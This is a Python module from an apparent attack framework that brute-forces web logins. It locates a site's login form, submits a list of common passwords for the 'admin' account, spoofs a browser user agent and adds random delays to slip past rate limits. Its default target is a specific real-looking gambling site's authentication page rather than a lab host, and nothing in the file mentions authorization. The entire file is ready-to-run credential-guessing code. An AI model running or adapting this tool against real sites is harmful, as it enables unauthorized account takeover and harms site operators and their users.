import requests
import time
import random
from bs4 import BeautifulSoup
from core.base_module import BaseModule
from typing import Dict, Optional

class LoginBrute(BaseModule):
    """
    Automated Login Brute-force & Admin Identification.
    Identifies login forms and attempts credential stuffing/brute-forcing.
    """
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "login_brute"
        self.description = "Automated login brute-force and admin identification."
        self.options = {
            "target_url": "https://runehall.com/?view=auth",
            "username": "admin",
            "wordlist": ["password", "admin123", "password123", "runehall", "admin2024"],
            "delay": 1.0,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        self.session = requests.Session()

    def find_login_fields(self, url: str) -> Optional[Dict]:
        """Scrapes the target URL to identify login form fields."""
        try:
            r = self.session.get(url, headers={"User-Agent": self.options["user_agent"]}, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Look for forms that likely handle authentication
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                fields = {}
                is_auth_form = False
                
                for i in inputs:
                    name = i.get('name')
                    itype = i.get('type', '').lower()
                    
                    if not name: continue
                    
                    if itype == 'password':
                        fields['password_field'] = name
                        is_auth_form = True
                    elif itype in ['text', 'email'] or 'user' in name.lower():
                        fields['username_field'] = name
                    elif itype == 'hidden':
                        fields[name] = i.get('value', '')
                
                if is_auth_form:
                    fields['action'] = form.get('action') or ''
                    fields['method'] = form.get('method', 'post').lower()
                    return fields
            return None
        except Exception as e:
            self.log(f"Error finding login fields: {e}", "error")
            return None

    def attempt_login(self, url: str, fields: Dict, username: str, password: str) -> bool:
        """Performs a single login attempt."""
        action_url = url if not fields['action'] else requests.compat.urljoin(url, fields['action'])
        
        data = fields.copy()
        u_field = data.pop('username_field', 'username')
        p_field = data.pop('password_field', 'password')
        data.pop('action', None)
        data.pop('method', None)
        
        data[u_field] = username
        data[p_field] = password
        
        try:
            if fields['method'] == 'post':
                r = self.session.post(action_url, data=data, headers={"User-Agent": self.options["user_agent"]}, timeout=10)
            else:
                r = self.session.get(action_url, params=data, headers={"User-Agent": self.options["user_agent"]}, timeout=10)
            
            # Check for success indicators (e.g., redirect, change in content, session cookie)
            # This is heuristic and may need tuning per target
            success_indicators = ['dashboard', 'logout', 'welcome', 'admin']
            if any(ind in r.text.lower() for ind in success_indicators) or r.status_code == 302:
                return True
            return False
        except Exception as e:
            self.log(f"Login attempt failed: {e}", "error")
            return False

    def run(self, args):
        target = self.options["target_url"]
        username = self.options["username"]
        wordlist = self.options["wordlist"]
        
        # Handle comma-separated string from CLI
        if isinstance(wordlist, str):
            passwords = [p.strip() for p in wordlist.split(',')]
        else:
            passwords = wordlist
        
        self.log(f"Identifying login structure for {target}...")
        fields = self.find_login_fields(target)
        
        if not fields:
            self.log("Could not identify login form. Attempting generic brute-force...", "warning")
            fields = {'username_field': 'username', 'password_field': 'password', 'action': '', 'method': 'post'}
        
        self.log(f"Form found. Username field: {fields.get('username_field')}, Password field: {fields.get('password_field')}")
        self.log(f"Starting brute-force for user: {username}")
        
        for password in passwords:
            self.log(f"Testing: {username}:{password}")
            if self.attempt_login(target, fields, username, password):
                print(f"\n[!] SUCCESS: Found valid credentials -> {username}:{password}")
                return
            
            time.sleep(float(self.options["delay"]) + random.uniform(0, 0.5))
        
        print("\n[-] Brute-force completed. No valid credentials found.")
